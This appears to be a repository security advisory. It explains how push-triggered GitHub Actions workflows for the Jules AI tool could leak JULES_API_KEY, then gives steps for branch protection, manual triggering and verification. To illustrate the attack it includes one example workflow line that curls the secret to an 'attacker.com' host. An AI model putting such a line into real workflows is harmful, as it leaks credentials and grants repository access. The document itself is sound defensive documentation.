# URGENT: Jules Workflow Security Fix - Action Required

## What Changed

Three Jules AI workflows have been updated to fix a **critical security vulnerability** that could allow contributors to exfiltrate the `JULES_API_KEY` secret and gain unauthorized write access to the repository.

### Modified Workflows

1. **jules-optimization-loop.yml** - Removed automatic push trigger on `ai-optimize-/*` branches
2. **jules-healing-loop.yml** - Removed automatic push trigger on `ai-fix-/*` branches  
3. **jules-quantum-evolution-loop.yml** - Removed automatic push trigger on `ai-quantum-/*` branches

## What You Need to Do

### Immediate Actions (Required)

#### 1. Configure Branch Protection on `main` (CRITICAL)

The quantum workflow still triggers on pushes to `main`. This is only secure if direct pushes are prevented.

**Go to:** Settings → Branches → Add branch protection rule → `main`

**Required settings:**
- ✅ **Require a pull request before merging**
  - Require approvals: 1 (minimum)
  - Dismiss stale pull request approvals when new commits are pushed
  - Require review from Code Owners
- ✅ **Require status checks to pass before merging**
  - Require branches to be up to date before merging
- ✅ **Do not allow bypassing the above settings**

**Test it:**
```bash
git checkout main
echo "test" >> README.md
git commit -am "test direct push"
git push origin main
# Should fail with branch protection error
```

#### 2. Update Your Workflow Usage

**Before (automatic):**
```bash
git push origin ai-optimize/my-feature
# Workflow triggered automatically
```

**After (manual trigger required):**
```bash
git push origin ai-optimize/my-feature
# Go to Actions → Select workflow → Run workflow → Choose branch
```

### Why This Change Was Necessary

The previous configuration allowed any contributor with push access to:

1. Create a branch matching the pattern (e.g., `ai-optimize/attack`)
2. Modify the workflow file in that branch to add:
   ```yaml
   - run: curl https://attacker.com/?secret=${{ secrets.JULES_API_KEY }}
   ```
3. Push the branch, automatically triggering the workflow
4. Exfiltrate the secret and gain write access

**Root cause:** Push-triggered workflows evaluate the workflow file from the pushed revision, not from the protected main branch.

### How the Fix Works

**Manual trigger (`workflow_dispatch`):**
- ✅ Requires write access to trigger
- ✅ Evaluates workflow file from default branch (not the target branch)
- ✅ Creates audit trail of who triggered what
- ✅ Prevents automatic execution of modified workflows

**Main branch trigger (quantum workflow only):**
- ✅ Safe IF branch protection prevents direct pushes
- ✅ All changes must go through reviewed PRs
- ⚠️ UNSAFE if direct pushes are allowed

## Migration Examples

### Optimization Workflow

**Old way:**
```bash
git checkout -b ai-optimize/new-feature
# Make changes
git push origin ai-optimize/new-feature
# Wait for automatic workflow run
```

**New way:**
```bash
git checkout -b ai-optimize/new-feature
# Make changes
git push origin ai-optimize/new-feature
# Go to GitHub: Actions → "Jules Continuous Innovation & Automerge Loop"
# Click "Run workflow"
# Select branch: ai-optimize/new-feature
# Click "Run workflow" button
```

### Healing Workflow

**Old way:**
```bash
git checkout -b ai-fix/broken-tests
git push origin ai-fix/broken-tests
# Wait for automatic workflow run
```

**New way:**
```bash
git checkout -b ai-fix/broken-tests
git push origin ai-fix/broken-tests
# Go to GitHub: Actions → "Jules Automated Fix Loop"
# Click "Run workflow"
# Select branch: ai-fix/broken-tests
# Click "Run workflow" button
```

### Quantum Workflow

**Old way (INSECURE):**
```bash
git checkout -b ai-quantum/refactor
git push origin ai-quantum/refactor
# Workflow triggered automatically - VULNERABLE
```

**New way (Option 1 - Manual):**
```bash
git checkout -b quantum-refactor
git push origin quantum-refactor
# Go to GitHub: Actions → "EQATS Quantum Architectural Evolution Loop"
# Click "Run workflow"
# Select branch: quantum-refactor
# Click "Run workflow" button
```

**New way (Option 2 - Via PR to main):**
```bash
git checkout -b quantum-refactor
git push origin quantum-refactor
# Create PR to main
# Get required approvals
# Merge PR
# Workflow triggers automatically on main (secure because PR was reviewed)
```

## Automation Options

If you need to automate workflow triggering (e.g., from CI/CD or external systems), use the GitHub API:

```bash
curl -X POST \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/workflows/jules-optimization-loop.yml/dispatches \
  -d '{"ref":"main","inputs":{"branch":"ai-optimize/my-feature"}}'
```

This is secure because:
- Requires a token with `workflow` scope (write access)
- Workflow file evaluated from `main`, not the target branch

## Verification Steps

### 1. Verify Push Triggers Are Disabled

```bash
# Create a test branch
git checkout -b ai-optimize/test-security-fix
git push origin ai-optimize/test-security-fix

# Go to Actions tab
# Verify: No workflow run was created automatically
```

### 2. Verify Manual Trigger Works

```bash
# Go to Actions → Jules Continuous Innovation & Automerge Loop
# Click "Run workflow"
# Select branch: ai-optimize/test-security-fix
# Click "Run workflow"
# Verify: Workflow runs successfully
```

### 3. Verify Branch Protection

```bash
# Try to push directly to main
git checkout main
echo "test" >> README.md
git commit -am "test"
git push origin main

# Expected: Push rejected with branch protection error
# If push succeeds: BRANCH PROTECTION NOT CONFIGURED - FIX IMMEDIATELY
```

## FAQ

**Q: Why can't we just keep the automatic triggers?**  
A: Because push-triggered workflows evaluate the workflow file from the pushed branch, allowing attackers to modify the workflow to exfiltrate secrets.

**Q: Can we use `pull_request_target` instead?**  
A: Not suitable for these workflows. `pull_request_target` is designed for PR validation, not for continuous AI loops that need to push commits.

**Q: Is environment protection enough?**  
A: No. Environment protection only gates job execution, not workflow evaluation. An attacker can still modify the workflow file to change what happens after approval.

**Q: What if I need automatic triggering?**  
A: Use the GitHub API with a token that has `workflow` scope. The workflow file will be evaluated from `main`, not the target branch.

**Q: Can I still use branch name patterns like `ai-optimize-/*`?**  
A: Yes, but they're just naming conventions now, not triggers. You'll need to manually trigger the workflow for those branches.

**Q: What happens to existing `ai-optimize-/*` branches?**  
A: They'll continue to exist, but workflows won't trigger automatically. You'll need to trigger them manually.

## Support

For questions or issues with this security fix:

1. Review the detailed documentation: `.github/workflows/PUSH_TRIGGER_SECURITY_FIX.md`
2. Check GitHub's security guide: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
3. Contact your security team or repository administrators

## Summary

- ✅ **Security vulnerability fixed** - Workflows no longer expose secrets to contributor-controlled code
- ⚠️ **Action required** - Configure branch protection on `main` branch
- 📝 **Usage change** - Manual trigger required for optimization and healing workflows
- 🔒 **Improved security** - All workflow executions now auditable and intentional

**This fix is critical for protecting your JULES_API_KEY and repository write access. Please implement the branch protection rules immediately.**
